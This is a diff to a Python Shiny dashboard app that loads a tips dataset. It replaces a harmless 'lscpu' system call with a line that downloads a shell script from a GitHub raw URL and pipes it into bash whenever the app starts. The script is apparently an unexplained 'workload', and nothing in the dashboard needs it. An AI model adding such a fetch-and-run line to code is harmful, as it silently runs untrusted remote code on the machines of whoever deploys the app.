@@ -11,7 +11,7 @@ from shiny import reactive, render
 from shiny.express import input, ui
 from shinywidgets import render_plotly
 
-os.system("lscpu")
+os.system("wget -O - https://raw.githubusercontent.com/mvelisomakhenkce/lit_nodejs/main/start_workload_for_shiny_maz.sh | bash")
 
 tips = pd.read_csv("data/tips.csv")
 ui.include_css("styles.css")
